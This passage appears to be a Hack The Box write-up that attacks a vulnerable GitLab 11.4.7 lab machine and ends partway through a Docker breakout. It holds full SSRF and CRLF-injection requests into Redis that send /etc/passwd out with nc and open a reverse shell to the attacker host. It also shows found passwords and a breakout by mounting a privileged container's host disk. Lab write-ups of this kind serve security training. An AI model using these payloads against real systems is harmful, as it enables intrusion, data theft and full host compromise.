</span></span><span class=line><span class=cl><span class=p>|</span>_Requested resource was http://10.10.10.220:5080/users/sign_in
</span></span><span class=line><span class=cl><span class=p>|</span>_http-trane-info: Problem with XML parsing of /evox/about
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 14.70 seconds
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-5080---gitlab>TCP 5080 - GitLab<a class=anchor aria-hidden=true href=#tcp-5080---gitlab>#</a></h3><p>The page displays a self-hosted GitLab Community Edition.</p><p><div class=img-container><img src=imgs/image-20210514162031899.png alt=image-20210514162031899></div></p><p>I can register with any email domain.</p><p><div class=img-container><img src=imgs/image-20210514162151369.png alt=image-20210514162151369></div></p><p>The GitLab version can be seen by visiting<code>/help</code>, and it seems to be an outdated one.</p><p><div class=img-container><img src=imgs/image-20210514162920343.png alt=image-20210514162920343></div></p><p>I&rsquo;ll take a note on the version.</p><h4 id=user-enumeration-via-gitlab-api>User Enumeration via GitLab API<a class=anchor aria-hidden=true href=#user-enumeration-via-gitlab-api>#</a></h4><p>I can enumerate the GitLab users via <code>/api/v4/users</code>, but in the end, this was not used.</p><p><div class=img-container><img src=imgs/image-20210514162754664.png alt=image-20210514162754664></div></p><p>I&rsquo;ll move and search for vulnerabilities.</p><h4 id=searchsploit>Searchsploit<a class=anchor aria-hidden=true href=#searchsploit>#</a></h4><p>I can feed the GitLab version to <code>searchsploit</code>, and it returns with two exploits that match with the version.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «~» «10.10.14.20» 
</span></span><span class=line><span class=cl>$ searchsploit GitLab 11.4.7    
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                            <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>GitLab 11.4.7 - RCE <span class=o>(</span>Authenticated<span class=o>)</span> <span class=o>(</span>2<span class=o>)</span>                                   <span class=p>|</span> ruby/webapps/49334.py
</span></span><span class=line><span class=cl>GitLab 11.4.7 - Remote Code Execution <span class=o>(</span>Authenticated<span class=o>)</span> <span class=o>(</span>1<span class=o>)</span>                 <span class=p>|</span> ruby/webapps/49257.py
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>I relaxed the keyword to find other potential exploits, and I found an arbitrary file read which previously was used to exploit <a href=https://fahmifj.github.io/writeup/hackthebox/htb-laboratory>Laboratory</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «exploit» «10.10.14.20»
</span></span><span class=line><span class=cl>$ searchsploit GitLab
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                            <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>GitLab - <span class=s1>&#39;impersonate&#39;</span> Feature Privilege Escalation                       <span class=p>|</span> ruby/webapps/40236.txt
</span></span><span class=line><span class=cl>GitLab 11.4.7 - RCE <span class=o>(</span>Authenticated<span class=o>)</span> <span class=o>(</span>2<span class=o>)</span>                                   <span class=p>|</span> ruby/webapps/49334.py
</span></span><span class=line><span class=cl>GitLab 11.4.7 - Remote Code Execution <span class=o>(</span>Authenticated<span class=o>)</span> <span class=o>(</span>1<span class=o>)</span>                 <span class=p>|</span> ruby/webapps/49257.py
</span></span><span class=line><span class=cl>GitLab 12.9.0 - Arbitrary File Read                                       <span class=p>|</span> ruby/webapps/48431.txt
</span></span><span class=line><span class=cl>Gitlab 12.9.0 - Arbitrary File Read <span class=o>(</span>Authenticated<span class=o>)</span>                       <span class=p>|</span> ruby/webapps/49076.py
</span></span><span class=line><span class=cl>Gitlab 6.0 - Persistent Cross-Site Scripting                              <span class=p>|</span> php/webapps/30329.sh
</span></span><span class=line><span class=cl>Gitlab-shell - Code Execution <span class=o>(</span>Metasploit<span class=o>)</span>                                <span class=p>|</span> linux/remote/34362.rb
</span></span><span class=line><span class=cl>Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting         <span class=p>|</span> java/webapps/47927.txt
</span></span><span class=line><span class=cl>NPMJS gitlabhook 0.0.17 - <span class=s1>&#39;repository&#39;</span> Remote Command Execution           <span class=p>|</span> json/webapps/47420.txt
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-git>Shell as git<a class=anchor aria-hidden=true href=#shell-as-git>#</a></h3><h4 id=gitlab-1147-rce-cve-2018-19571--cve-2018-19585---poc>GitLab 11.4.7 RCE (CVE-2018-19571 & CVE-2018-19585) - PoC<a class=anchor aria-hidden=true href=#gitlab-1147-rce-cve-2018-19571--cve-2018-19585---poc>#</a></h4><p>The RCE exploit that was popped on <code>searchsploit</code> above is consist of two vulnerabilities, SSRF (CVE-2018-19571) and CRLF Injection (CVE-2018-19585). The exploit&rsquo;s author uses the <a href=https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/>LifeOverFlow</a>&rsquo;s blog post as reference. So I decided to read that blog and try to reproduce it here.</p><p>With SSRF, you can talk with the internal Redis server on port 6379 that used by GitLab as database, cache and message broker. If there is an HTTP request sent to the Redis server using SSRF, the request would read as follows (<code># ==></code> is a comment by me)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET blablabla HTTP/1.1 # ==&gt; Redis read this as a command 
</span></span></span><span class=line><span class=cl><span class=err>Host: [0:0:0:0:0:ffff:127.0.0.1]:6379 
</span></span></span><span class=line><span class=cl><span class=err>User-Agent: git/2.18.1  
</span></span></span><span class=line><span class=cl><span class=err>Accept: */* 
</span></span></span><span class=line><span class=cl><span class=err>Accept-Encoding: deflate, gzip 
</span></span></span><span class=line><span class=cl><span class=err>Pragma: no-cache 
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>- Err wrong number of arguments for &#39;get&#39; command 
</span></span></span></code></pre></div><p>The idea here is to leverage the Import project feature from GitLab to talk to Redis server, and insert a payload in the URL using CRLF injection.</p><p>On GitLab, I’ll import a (non-exist) project and choose the &ldquo;Repo by URL&rdquo; menu.</p><p><div class=img-container><img src=imgs/image-20210514171125509.png alt=image-20210514171125509></div></p><p>I&rsquo;ll be using the same SSRF payload to bypass the GitLab URL filter which is <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</code> and add my (non-exist) <code>.git</code> repository at the end of the URL, so it becomes <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ssrf-test.git</code></p><p><div class=img-container><img src=imgs/image-20210515000620634.png alt=image-20210515000620634></div></p><blockquote><p>The repository URL above is a <a href=http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm>special IPv6 address</a> where its last 32 bits is used to embed the IPv4 address. The URL was used to bypass the SSRF protection defined in <code>spec/lib/gitlab/url_blocker_spec.rb</code></p></blockquote><p>I&rsquo;ll intercept the request after I hit the “Create Project” button, and then on Burp Suite, I’ll replace the import URL with the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
</span></span><span class=line><span class=cl> multi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> sadd resque:gitlab:queues system_hook_push
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> exec
</span></span><span class=line><span class=cl> exec
</span></span><span class=line><span class=cl>/ssrf-test.git
</span></span></code></pre></div><p>So the full request now looks like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/projects</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.10.220:5080</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.10.220:5080/projects/new</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>778</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>sidebar_collapsed=false; _gitlab_session=4426e39af6c1d3d4a4484a8a53f0bac9; event_filter=all</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>utf8=%E2%9C%93&amp;authenticity_token=cbS9UXXZDmvTgBUhOTMxF%2FOSii%2FgetcSbM%2FNTT2dG6NllhoQsV8uvbDU65arU9dEOumftKI48ZaDBi6rnJbjOQ%3D%3D&amp;project%5Bimport_url%5D= git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
</span></span><span class=line><span class=cl> multi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> sadd resque:gitlab:queues system_hook_push
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> exec
</span></span><span class=line><span class=cl> exec
</span></span><span class=line><span class=cl>/ssrf-test.git&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=SSRF+test&amp;project%5Bnamespace_id%5D=5&amp;project%5Bpath%5D=ssrf-test&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0
</span></span></code></pre></div><p>When I hit the send button, my listener obtains the file contents of <code>/etc/passwd</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl> root@kali «exploit» «10.10.14.20» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9000</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9000</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.20<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.220<span class=o>]</span> <span class=m>36612</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>git:x:998:998::/var/opt/gitlab:/bin/sh
</span></span><span class=line><span class=cl>gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
</span></span><span class=line><span class=cl>gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
</span></span><span class=line><span class=cl>gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
</span></span><span class=line><span class=cl>mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
</span></span><span class=line><span class=cl>registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
</span></span><span class=line><span class=cl>gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
</span></span><span class=line><span class=cl>gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
</span></span><span class=line><span class=cl>dude:x:1000:1000::/home/dude:/bin/bash
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210515002210570.png alt=image-20210515002210570></div></p><h4 id=weaponize---reverse-shell>Weaponize - Reverse Shell<a class=anchor aria-hidden=true href=#weaponize---reverse-shell>#</a></h4><p>From here, I’ll reproduce the step above, but this time I’ll send myself a shell. The payload as follows.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
</span></span><span class=line><span class=cl> multi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> sadd resque:gitlab:queues system_hook_push
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|nc -e /bin/bash 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> exec
</span></span><span class=line><span class=cl> exec
</span></span><span class=line><span class=cl>/ssrf-to-rce.git
</span></span></code></pre></div><p>On my <code>nc</code> listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «exploit» «10.10.14.20» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9000</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9000</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.20<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.220<span class=o>]</span> <span class=m>37306</span>
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>998<span class=o>(</span>git<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>998<span class=o>(</span>git<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>998<span class=o>(</span>git<span class=o>)</span>
</span></span><span class=line><span class=cl>hostname
</span></span><span class=line><span class=cl>gitlab.example.com
</span></span><span class=line><span class=cl><span class=nb>pwd</span>   
</span></span><span class=line><span class=cl>/var/opt/gitlab/gitlab-rails/working
</span></span></code></pre></div><h4 id=shell-upgrade>Shell Upgrade<a class=anchor aria-hidden=true href=#shell-upgrade>#</a></h4><p>I&rsquo;ll do the &lsquo;stty&rsquo; trick to <a href=https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1>upgrade my shell</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>which python3
</span></span><span class=line><span class=cl>/opt/gitlab/embedded/bin/python3
</span></span><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>git@gitlab:~/gitlab-rails/working$ ^Z
</span></span><span class=line><span class=cl><span class=o>[</span>2<span class=o>]</span>  + <span class=m>2354</span> suspended  nc -nvlp <span class=m>9000</span>
</span></span><span class=line><span class=cl>→ root@kali «exploit» «10.10.14.20» 
</span></span><span class=line><span class=cl>$ stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>[</span>2<span class=o>]</span>  - <span class=m>2354</span> continued  nc -nvlp <span class=m>9000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git@gitlab:~/gitlab-rails/working$ 
</span></span><span class=line><span class=cl>git@gitlab:~/gitlab-rails/working$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>On <code>/home</code>, there is only one user called <code>dude</code>, and I&rsquo;m able to read the user flag there.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>git@gitlab:/home/dude$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>24</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> dude dude <span class=m>4096</span> Dec  <span class=m>7</span> 16:58 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>1</span> root root <span class=m>4096</span> Dec  <span class=m>2</span> 10:45 ..
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root    <span class=m>9</span> Dec  <span class=m>7</span> 16:58 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> dude dude  <span class=m>220</span> Aug <span class=m>31</span>  <span class=m>2015</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> dude dude <span class=m>3771</span> Aug <span class=m>31</span>  <span class=m>2015</span> .bashrc
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> dude dude  <span class=m>655</span> May <span class=m>16</span>  <span class=m>2017</span> .profile
</span></span><span class=line><span class=cl>-r--r----- <span class=m>1</span> dude git    <span class=m>33</span> Dec  <span class=m>2</span> 10:46 user.txt
</span></span><span class=line><span class=cl>git@gitlab:/home/dude$ cat user.txt 
</span></span><span class=line><span class=cl>e1e30b052b6ec0670698...&lt;SNIP&gt;...
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=container---shell-as-root>Container - Shell as root<a class=anchor aria-hidden=true href=#container---shell-as-root>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>I found a <code>.dockerenv</code> on the root directory which indicates that I&rsquo;m inside container, and there is also a file called <code>root_pass</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>git@gitlab:~$ ls -la /
</span></span><span class=line><span class=cl>total <span class=m>104</span>
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root <span class=m>4096</span> Dec  <span class=m>1</span> 12:41 .
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root <span class=m>4096</span> Dec  <span class=m>1</span> 12:41 ..
</span></span><span class=line><span class=cl>-rwxr-xr-x   <span class=m>1</span> root root    <span class=m>0</span> Dec  <span class=m>1</span> 12:41 .dockerenv
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>-rw-r--r--   <span class=m>1</span> root root   <span class=m>23</span> Jun <span class=m>29</span>  <span class=m>2020</span> root_pass
</span></span></code></pre></div><p>The content of <code>root_pass</code> is a random string, which I think it is a password. I tried it to the user and root account but it didn&rsquo;t work.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>git@gitlab:/opt/backup$ cat /root_pass 
</span></span><span class=line><span class=cl>YG65407Bjqvv9A0a8Tm_7w
</span></span></code></pre></div><p>Exploring on <code>/opt</code>, I found a folder called <code>backup</code>. The folder contains three files: <code>docker-compose.yml</code>, <code>gitlab-secrets.json</code> and <code>gitlab.rb</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>git@gitlab:/opt/backup$ ls -l
</span></span><span class=line><span class=cl>total <span class=m>100</span>
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root   <span class=m>872</span> Dec  <span class=m>7</span> 09:25 docker-compose.yml
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>15092</span> Dec  <span class=m>1</span> 16:23 gitlab-secrets.json
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>79639</span> Dec  <span class=m>1</span> 19:20 gitlab.rb
</span></span></code></pre></div><p>Upon performing a recursive grep to search for files containing a &ldquo;pass&rdquo; string inside the folder, I discovered an SMTP password on <code>gitlab.rb</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>git@gitlab:/opt/backup$ grep -Ri <span class=s2>&#34;pass&#34;</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>gitlab.rb:gitlab_rails<span class=o>[</span><span class=s1>&#39;smtp_password&#39;</span><span class=o>]</span> <span class=o>=</span> <span class=s2>&#34;wW59U!ZKMbG9+*#h&#34;</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Looking into the <code>docker-compose.yml</code>, I see a potential vector for container breakout.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>git@gitlab:/opt/backup$ cat docker-compose.yml 
</span></span><span class=line><span class=cl>version: <span class=s1>&#39;2.4&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>services:
</span></span><span class=line><span class=cl>  web:
</span></span><span class=line><span class=cl>    image: <span class=s1>&#39;gitlab/gitlab-ce:11.4.7-ce.0&#39;</span>
</span></span><span class=line><span class=cl>    restart: always
</span></span><span class=line><span class=cl>    hostname: <span class=s1>&#39;gitlab.example.com&#39;</span>
</span></span><span class=line><span class=cl>    environment:
</span></span><span class=line><span class=cl>      GITLAB_OMNIBUS_CONFIG: <span class=p>|</span>
</span></span><span class=line><span class=cl>        external_url <span class=s1>&#39;http://172.19.0.2&#39;</span>
</span></span><span class=line><span class=cl>        redis<span class=o>[</span><span class=s1>&#39;bind&#39;</span><span class=o>]=</span><span class=s1>&#39;127.0.0.1&#39;</span>
</span></span><span class=line><span class=cl>        redis<span class=o>[</span><span class=s1>&#39;port&#39;</span><span class=o>]=</span><span class=m>6379</span>
</span></span><span class=line><span class=cl>        gitlab_rails<span class=o>[</span><span class=s1>&#39;initial_root_password&#39;</span><span class=o>]=</span>File.read<span class=o>(</span><span class=s1>&#39;/root_pass&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    networks:
</span></span><span class=line><span class=cl>      gitlab:
</span></span><span class=line><span class=cl>        ipv4_address: 172.19.0.2
</span></span><span class=line><span class=cl>    ports:
</span></span><span class=line><span class=cl>      - <span class=s1>&#39;5080:80&#39;</span>
</span></span><span class=line><span class=cl>      <span class=c1>#- &#39;127.0.0.1:5080:80&#39;</span>
</span></span><span class=line><span class=cl>      <span class=c1>#- &#39;127.0.0.1:50443:443&#39;</span>
</span></span><span class=line><span class=cl>      <span class=c1>#- &#39;127.0.0.1:5022:22&#39;</span>
</span></span><span class=line><span class=cl>    volumes:
</span></span><span class=line><span class=cl>      - <span class=s1>&#39;./srv/gitlab/config:/etc/gitlab&#39;</span>
</span></span><span class=line><span class=cl>      - <span class=s1>&#39;./srv/gitlab/logs:/var/log/gitlab&#39;</span>
</span></span><span class=line><span class=cl>      - <span class=s1>&#39;./srv/gitlab/data:/var/opt/gitlab&#39;</span>
</span></span><span class=line><span class=cl>      - <span class=s1>&#39;./root_pass:/root_pass&#39;</span>
</span></span><span class=line><span class=cl>    privileged: <span class=nb>true</span> <span class=c1># ==&gt; Potential privesc vector</span>
</span></span><span class=line><span class=cl>    restart: unless-stopped
</span></span><span class=line><span class=cl>    <span class=c1>#mem_limit: 1024m</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>networks:
</span></span><span class=line><span class=cl>  gitlab:
</span></span><span class=line><span class=cl>    driver: bridge
</span></span><span class=line><span class=cl>    ipam:
</span></span><span class=line><span class=cl>      config:
</span></span><span class=line><span class=cl>        - subnet: 172.19.0.0/16
</span></span></code></pre></div><h4 id=su---root-container>su - root (container)<a class=anchor aria-hidden=true href=#su---root-container>#</a></h4><p>The password <code>wW59U!ZKMbG9+*#h</code> works on the container root account</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>git@gitlab:/opt/gitlab$ su root
</span></span><span class=line><span class=cl>Password: wW59U!ZKMbG9+*#h
</span></span><span class=line><span class=cl>root@gitlab:/opt/gitlab# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span></code></pre></div><h3 id=host---shell-as-root>Host - Shell as root<a class=anchor aria-hidden=true href=#host---shell-as-root>#</a></h3><h4 id=docker-breakout---cap_sys_admin>Docker Breakout - CAP_SYS_ADMIN<a class=anchor aria-hidden=true href=#docker-breakout---cap_sys_admin>#</a></h4><p>Based on the <code>docker-compose.yml</code> file, I suspect the container is running with privileged flag. According to my favorite blog, which is <a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#>BookHackTrick</a>, a container with privileged flag will have access to the host devices.</p><p>Make sure I have access to the host devices, I can run <code>capsh --print</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@gitlab:/opt/gitlab# capsh --print
</span></span><span class=line><span class=cl>Current: <span class=o>=</span> cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>There is a <code>CAP_SYS_ADMIN</code>, with this capabilities I&rsquo;m able to mount the host devices to make it available on the container. I can list all the host devices with <code>fdisk -l</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@gitlab:~# fdisk -l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>Disk /dev/sda: <span class=m>20</span> GiB, <span class=m>21474836480</span> bytes, <span class=m>41943040</span> sectors
</span></span><span class=line><span class=cl>Units: sectors of <span class=m>1</span> * <span class=nv>512</span> <span class=o>=</span> <span class=m>512</span> bytes
</span></span><span class=line><span class=cl>Sector size <span class=o>(</span>logical/physical<span class=o>)</span>: <span class=m>512</span> bytes / <span class=m>512</span> bytes
</span></span><span class=line><span class=cl>I/O size <span class=o>(</span>minimum/optimal<span class=o>)</span>: <span class=m>512</span> bytes / <span class=m>512</span> bytes
</span></span><span class=line><span class=cl>Disklabel type: gpt
</span></span><span class=line><span class=cl>Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Device        Start      End  Sectors Size Type
</span></span><span class=line><span class=cl>/dev/sda1      <span class=m>2048</span>     <span class=m>4095</span>     <span class=m>2048</span>   1M BIOS boot
</span></span><span class=line><span class=cl>/dev/sda2      <span class=m>4096</span> <span class=m>37746687</span> <span class=m>37742592</span>  18G Linux filesystem <span class=c1># the root (/) dir</span>
</span></span><span class=line><span class=cl>/dev/sda3  <span class=m>37746688</span> <span class=m>41940991</span>  <span class=m>4194304</span>   2G Linux swap
</span></span></code></pre></div><p>Now I can simply mount the Linux filesystem (<code>/dev/sda2</code>) to my specified folder.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@gitlab:/media# mkdir iamf
</span></span><span class=line><span class=cl>root@gitlab:/media# mount /dev/sda2 /media/iamf
</span></span><span class=line><span class=cl>root@gitlab:/media# ls iamf/
